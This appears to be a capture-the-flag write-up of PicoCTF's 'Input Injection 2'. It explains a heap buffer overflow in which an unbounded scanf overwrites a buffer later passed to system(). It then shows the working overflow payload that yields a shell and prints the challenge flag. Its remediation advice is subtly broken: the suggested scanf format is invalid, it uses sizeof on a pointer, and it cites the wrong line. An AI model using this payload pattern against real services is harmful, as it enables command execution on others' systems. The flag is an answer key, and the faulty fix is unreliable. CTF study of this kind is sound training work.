# PicoCTF: Input Injection 2
## Context

The challenge is an ELF executable with a heap buffer overflow vulnerability, allowing a user to overwrite a call to `system()`.

**Artifacts**

This challenge provides a C source file, vuln.c, for a Linux userspace application, vuln (also provided). vuln is a little-endian x64 executable. The user connects to a challenge instance over netcat and communicates with a server running vuln.

**Running the challenge**

Upon connecting to the server and starting the challenge, the program prints the memory locations of two buffers, `username` and `shell`. It then asks for a username, repeats the name back, and prints the contents of the `shell` buffer. By default, the shell is `/bin/pwd`. Running the challenge locally, this prints the working directory, though when connecting to the challenge over netcat, no output is printed for the wrong command.

```
$ ./vuln 
username at 0x178d02a0
shell at 0x178d02d0
Enter username: a
Hello, a. Your shell is /bin/pwd.
/home/egk2133/ctf
```

Running the challenge multiple times, we see that the offset between `username` and `shell` is a constant `0x30` (48) bytes. We'll use this vulnerability to exploit the program and get the flag.

## Vulnerability

The vulnerability is a heap buffer overflow (CWE-122). Supporting the constant offset seen in the challenge instance above, the source code shows that the two buffers are allocated with fixed size in successive calls to `malloc()`. Because blocks are padded to 16-byte boundaries, the requested allocations are rounded up to 48 bytes each, and `shell` falls 48 bytes after `username`.

```
7   char* username = malloc(28);
8   char* shell = malloc(28);
```

The main issue is in lines 15-22. The code *first* calls `strcpy` to copy `"/bin/pwd"` into `shell` and *then* prompts the user to enter a username. It does not check if the contents of `shell` have changed before calling `system()`, which can execute a user-passed shell command. It also reads the user input into `username` using `scanf()`, which does not limit the number of characters read.

```
15	strcpy(shell, "/bin/pwd");
16	
17	printf("Enter username: ");
18  fflush(stdout);
19	scanf("%s", username);
20
21	printf("Hello, %s. Your shell is %s.\n", username, shell);
22	system(shell);
```

If the user inputs a username longer that the allocated 28 characters, the program will simply overwrite the heap memory past the buffer, and if the input is longer than 48 characters, the input will run into `shell`.

## Exploitation

With this vulnerability, the user can write past the `username` buffer and overwrite the contents of `shell` to execute a custom command. In my exploit, I used the vulnerability to create a reverse shell on the server and find the flag file.

```
$ nc amiable-citadel.picoctf.net 58688
username at 0x298ea2a0
shell at 0x298ea2d0
Enter username: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/bin/bash

/bin/ls
flag.txt
/bin/cat flag.txt
picoCTF{us3rn4m3_2_sh3ll_809f901a}
```

## Remediation

There are a couple of ways this program could be patched to mitigate the buffer overflow vulnerability.
- Check the contents of `shell` before execution using `strncmp()`.
- Enforce a length limit on the call to `scanf()` in line 15: `scanf("%.*s", sizeof(username) - 1, username);` and then null-terminate the buffer.
    - Alternatively, use `read()`, `fread()`, or `fgets()` to read the input from stdin, all of which allow specification of number of bytes to read.